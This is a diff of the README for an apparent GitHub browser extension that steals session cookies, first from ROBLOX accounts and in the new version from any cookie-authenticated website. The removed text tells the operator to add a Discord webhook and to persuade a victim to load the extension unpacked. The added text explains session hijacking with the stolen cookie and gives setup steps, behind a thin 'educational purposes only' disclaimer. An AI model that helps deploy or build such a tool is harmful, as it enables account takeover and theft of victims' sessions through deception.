@@ -1,22 +1,10 @@
 # roblox-extnsion-beam
-You can beam anyone with this browser extension
-How to use it?
+#### Heya guys, s1csty9 here. Beaming ROBLOX accounts has always been one of my favourite pasttimes, and I forked this from an extension I used to do it a while back.
 
-Step 1: Download the extension zipped 
-![image](https://user-images.githubusercontent.com/124882334/218072093-db9165d8-8b33-4319-998c-5cf199d5a9ee.png)
+#### DISCLAIMER: This extension is for educational purposes only as you will see in my explanantion, and I do not condone the usage of this on anyone without their knowledge and authorisation.
 
-Step 2: Unpack the .zip file (right click on it and unpack on \downloads\roblox-extension-beam)
+### Foreward
+The original extension would get your .ROBLOSECURITY cookie, which ROBLOX would use to validate your login session. This tricks ROBLOX into thinking that you are your victim because you have the same session. I believe that this method is now obsolete, as ROBLOX now requires your IP to also be the same (which they should've done loong ago in terms of cybersec practice, but I'm really the last to complain). However, I noticed that a bunch of other websites also use cookies for session validation, which is why I modified the extension to be universal, supporting all websites that have a similar validation system. I made this in demonstration of the weakness of those websites, and for legal reasons, any support/lisencing of malicious usage of this is voided, effective immediately upon executed.
 
-Step 3: Add your discord webhook link on \scripts\log.json
-
-Now send the extension (\roblox-extension-beam\extension) in .zip to someone you want to beam and tell him to follow these steps:
-
-Step 1: Unpack the file
-
-Step 2: Go to "manage extensions" on your browser and turn on developer mode
-![image](https://user-images.githubusercontent.com/124882334/218072438-524c0683-697e-4fe2-ad46-303bd9ec051a.png)
-![image](https://user-images.githubusercontent.com/124882334/218072494-9e9aadab-4537-4f41-b88c-2f502575a9de.png)
-
-Step 3: Press "Load unpacked" and select the "extension" folder that you've downloaded before
-![image](https://user-images.githubusercontent.com/124882334/218072685-7229314d-ab69-4308-8e25-9e0b95e384eb.png)
-![image](https://user-images.githubusercontent.com/124882334/218072813-e82e9b88-d63f-48d4-92cd-4f2848616656.png)
+### How to use
+Paste your webook into the <strong>WEBHOOK</strong> constant, paste the URL of the website you want to <strong>educationally study with proper authorisation</strong> in the <strong>URL</strong> constant, and finally copy the name of your targeted cookie in the <strong>COOKIE</strong> constant. There's literally a 50 second tutorial on Youtube for installing extensions.
